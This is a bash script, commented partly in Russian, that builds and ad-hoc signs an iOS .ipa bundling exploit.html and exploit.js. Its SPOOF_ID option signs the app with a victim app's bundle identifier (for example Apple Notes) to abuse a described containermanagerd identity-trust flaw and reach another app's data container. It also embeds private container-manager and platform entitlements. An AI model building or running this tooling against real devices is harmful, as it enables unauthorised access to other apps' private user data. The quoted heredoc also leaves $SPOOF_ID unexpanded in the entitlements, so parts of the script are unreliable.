#!/usr/bin/env bash
# package_ipa.sh: собирает Mach-O arm64 через Theos, отправляет в Payload/App.app,
# подписывает ldid -S (ad-hoc), zip'ит в .ipa. Использовать из папки проекта:
#   cd ~/ios_projects/Test-main && ./package_ipa.sh
set -euo pipefail
export THEOS="${THEOS:-$HOME/theos}"
export PATH="$THEOS/toolchain/linux/iphone/bin:$THEOS/bin:$HOME/ios-toolchain/bin:$HOME/.local/bin:$PATH"
APP_NAME="srk801"
PROJ="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="$PROJ/packages"
mkdir -p "$OUT"
cd "$PROJ"
# IOS_DEPLOY_TARGET (напр. arm64-apple-ios13.0 или 13.0) приходит из Tier-B
# workflow; локально не задан — используется TARGET из Makefile проекта.
MAKE_EXTRA=()
if [[ -n "${IOS_DEPLOY_TARGET:-}" ]]; then
    DEPLOY_VER="${IOS_DEPLOY_TARGET##*[^0-9.]}"
    DEPLOY_VER="${DEPLOY_VER:-13.0}"
    MAKE_EXTRA+=(TARGET="iphone:clang:latest:$DEPLOY_VER")
    echo "[IPA] deploy override: ${MAKE_EXTRA[*]}"
fi
echo "[IPA] make package FINALPACKAGE=1 ..."
# Theos refuses project paths with spaces: ALL make steps run through the
# space-free symlink (same inode, so .theos/ staging lands in $PROJ anyway).
LINK="/tmp/opencode/jb26link"
if [[ ! -e "$LINK" ]]; then
    mkdir -p "$(dirname "$LINK")"          # /tmp can be wiped between runs
    ln -s "$PROJ" "$LINK"
fi
if ! (cd "$LINK" && make package FINALPACKAGE=1 "${MAKE_EXTRA[@]}"); then
    echo "[IPA] WARN: make package упал — пробую голый make (без переупаковку)..."
    (cd "$LINK" && make clean >/dev/null 2>&1) || true
    (cd "$LINK" && make FINALPACKAGE=1 "${MAKE_EXTRA[@]}") || {        echo "[IPA] ERROR: сборка не взлетела. Если в логе 'module compiled with Swift X.Y' —" >&2
        echo "[IPA] ERROR: неверная пара тулчейн/SDK, чинится НЕ фоллбэком: bash mint_ios_setup.sh --doctor" >&2
        exit 1
    }
fi
BUNDLE="$(find .theos _ -type d -name "$APP_NAME.app" 2>/dev/null | head -1 || true)"
if [[ -z "$BUNDLE" ]]; then
    echo "[IPA] ERROR: не найден staged .app в .theos/" >&2
    exit 1
fi
echo "[IPA] staged app: $BUNDLE"
STAMP="$(date +%Y%m%d-%H%M%S)"
PAYLOAD="$PROJ/Payload"
rm -rf "$PAYLOAD" "$OUT/${APP_NAME}_${STAMP}.ipa"
mkdir -p "$PAYLOAD"
[[ -f "$BUNDLE/Info.plist" ]] || cp "$PROJ/Info.plist" "$BUNDLE/Info.plist" || true
cp -r "$BUNDLE" "$PAYLOAD/${APP_NAME}.app"
# SPOOF_ID: the containermanagerd "identity trust" flaw authorises the
# caller by the CodeDirectory identifier, and ldid takes the identifier
# from CFBundleIdentifier. To ask MCM for ANOTHER app's container we sign
# with the victim's identifier:
#   SPOOF_ID=com.apple.mobilenotes bash package_ipa.sh
if [[ -n "${SPOOF_ID:-}" ]]; then
    python3 "$PROJ/Tools/spoof_id.py" "$PAYLOAD/${APP_NAME}.app/Info.plist" "$SPOOF_ID"    echo "[IPA] CFBundleIdentifier -> $SPOOF_ID (spoofed)"
fi
# Theos stages each resource twice: at the bundle root (basename) AND under
# its relative subdirectory. The stage loads Resources/webkit/* via
# subdirectory:"webkit", so the root copies are removed to keep the bundle
# unambiguous.
rm -f "$PAYLOAD/${APP_NAME}.app/exploit.html" "$PAYLOAD/${APP_NAME}.app/exploit.js"
# ldid: the one in PATH (/home/abzal/.local/bin/ldid) is a BROKEN wrapper
# (it execs a bogus path and exits non-zero), and the old "|| true" hid
# that - so the binaries were never signed and the entitlements never
# applied. Pick a ldid that actually runs, and verify the result.
LDID=""
for cand in "$THEOS/toolchain/linux/iphone/bin/ldid" "$HOME/ios-toolchain/bin/ldid" "$(command -v ldid 2>/dev/null)"; do
    [ -x "$cand" ] || continue
    if "$cand" -e /dev/null >/dev/null 2>&1 || "$cand" >/dev/null 2>&1; then
        LDID="$cand"; break
    fi
done
if [ -n "$LDID" ]; then
    ENT_TMP="$(mktemp -d)/ent.plist"
    cat > "$ENT_TMP" <<'ENTPLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.mobile.MobileHouseArrest</key><true/>
    <key>application-identifier</key><string>$SPOOF_ID</string>
    <key>com.apple.private.MobileContainerManager.allowed</key><true/>
    <key>com.apple.private.security.storage.MobileContainerManager</key><true/>
    <key>com.apple.rootless.storage.MobileContainerManager</key><true/>
    <key>com.apple.private.security.container-required</key><false/>
    <key>platform-application</key><true/>
    <key>get-task-allow</key><true/>
</dict>
</plist>
ENTPLIST
    if "$LDID" -S"$ENT_TMP" "$PAYLOAD/${APP_NAME}.app/$APP_NAME"; then
        echo "[IPA] подписано ldid ($LDID) + entitlements"
    else
        echo "[IPA] WARN: ldid -S<ent> не отработал, пробую без entitlements" >&2
        "$LDID" -S "$PAYLOAD/${APP_NAME}.app/$APP_NAME" || echo "[IPA] WARN: подпись не удалась" >&2
    fi
    # verify: the entitlements MUST be in the binary
    if "$LDID" -e "$PAYLOAD/${APP_NAME}.app/$APP_NAME" 2>/dev/null | grep -q "MobileHouseArrest"; then
        echo "[IPA] entitlements ПОДТВЕРЖДЕНЫ в бинарнике"
    else
        echo "[IPA] ВНИМАНИЕ: entitlements в бинарнике НЕТ" >&2
    fi
else
    echo "[IPA] WARN: рабочий ldid не найден - приложение останется без подписи." >&2
fi
(cd "$PROJ" && zip -qry "$OUT/${APP_NAME}_${STAMP}.ipa" Payload)
rm -rf "$PAYLOAD"
echo "[IPA] ГОТОВО: $OUT/${APP_NAME}_${STAMP}.ipa"
ls -la "$OUT/${APP_NAME}_${STAMP}.ipa"
